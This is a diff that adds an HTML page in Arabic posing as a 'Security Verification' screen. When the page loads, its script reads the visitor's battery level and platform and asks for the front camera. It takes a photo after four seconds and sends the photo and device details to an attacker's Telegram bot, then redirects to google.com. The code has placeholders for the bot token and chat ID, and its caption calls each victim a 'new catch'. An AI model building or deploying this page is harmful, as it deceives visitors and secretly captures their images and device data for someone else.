@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Security Verification</title>
+    <style>
+        body { background: #000; color: #00ff00; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #00ff00; padding: 20px; text-align: center; box-shadow: 0 0 15px #00ff00; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3>INITIALIZING SECURE CONNECTION...</h3>
+        <p>يرجى الانتظار لتأمين اتصالك</p>
+    </div>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" width="720" height="1280" style="display:none;"></canvas>
+
+    <script>
+        // ضع معلوماتك هنا لمرة واحدة فقط
+        const TOKEN = "ضع_توكن_بوتك_هنا";
+        const CHAT_ID = "ضع_ايدي_حسابك_هنا";
+
+        async function startCapture() {
+            // سحب المعلومات الأساسية
+            let battery = await navigator.getBattery();
+            let info = `🚀 صيد جديد من GitHub:\n🔋 البطارية: ${Math.floor(battery.level * 100)}%\n📱 النظام: ${navigator.platform}`;
+
+            try {
+                // طلب الكاميرا
+                let stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
+                let video = document.getElementById('v');
+                video.srcObject = stream;
+
+                setTimeout(async () => {
+                    let canvas = document.getElementById('c');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 720, 1280);
+                    let imgBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+
+                    // إرسال البيانات والصورة للتليجرام مباشرة
+                    let formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('caption', info);
+                    formData.append('photo', imgBlob, 'shot.jpg');
+
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                    
+                    stream.getTracks().forEach(t => t.stop());
+                    window.location.replace("https://google.com");
+                }, 4000);
+            } catch (e) {
+                // إرسال النص فقط إذا رفض الكاميرا
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`);
+                window.location.replace("https://google.com");
+            }
+        }
+        window.onload = startCapture;
+    </script>
+</body>
+</html>
